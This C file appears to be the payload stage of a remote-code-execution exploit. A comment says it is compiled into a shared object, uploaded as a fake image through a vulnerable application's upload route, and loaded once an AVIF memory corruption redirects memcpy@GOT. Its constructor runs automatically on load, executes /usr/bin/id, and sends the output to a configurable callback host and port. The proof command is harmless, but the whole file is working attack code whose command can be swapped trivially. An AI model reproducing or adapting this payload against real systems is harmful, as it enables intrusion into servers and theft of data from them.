#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#ifndef CALLBACK_HOST
#define CALLBACK_HOST "127.0.0.1"
#endif

#ifndef CALLBACK_PORT
#define CALLBACK_PORT 31337
#endif

#ifndef CALLBACK_TOKEN
#define CALLBACK_TOKEN "UNSET"
#endif

static void write_all(int fd, const char *data, size_t length) {
  while (length > 0) {
    ssize_t written = write(fd, data, length);
    if (written <= 0) {
      return;
    }
    data += written;
    length -= (size_t)written;
  }
}

/*
 * The exploit compiles this shared object on the attacker machine, then sends
 * the resulting ELF through the vulnerable application's image-upload route
 * under an image filename. No compiler or source file is placed on the target.
 *
 * The GModule loader runs this constructor when the AVIF corruption redirects
 * memcpy@GOT to the uploaded library. The constructor executes only the fixed
 * proof command `/usr/bin/id`. The token correlates the callback with this run;
 * the returned `uid=...` output is the command-execution proof.
 */
__attribute__((constructor))
static void callback(void) {
  static const char header[] =
      "KAN2159_RCE_CALLBACK " CALLBACK_TOKEN "\n"
      "KAN2159_COMMAND /usr/bin/id\n";
  char command_output[1024] = {0};
  FILE *command = popen("/usr/bin/id", "r");
  if (command == NULL) {
    return;
  }
  size_t output_length = fread(
      command_output, 1, sizeof(command_output) - 1, command);
  int command_status = pclose(command);
  if (command_status != 0 || output_length == 0) {
    return;
  }

  struct sockaddr_in address;
  int fd = socket(AF_INET, SOCK_STREAM, 0);
  if (fd < 0) {
    return;
  }
  memset(&address, 0, sizeof(address));
  address.sin_family = AF_INET;
  address.sin_port = htons(CALLBACK_PORT);
  if (inet_pton(AF_INET, CALLBACK_HOST, &address.sin_addr) != 1) {
    close(fd);
    return;
  }
  if (connect(fd, (struct sockaddr *)&address, sizeof(address)) == 0) {
    write_all(fd, header, sizeof(header) - 1);
    write_all(fd, command_output, output_length);
  }
  (void)close(fd);
}
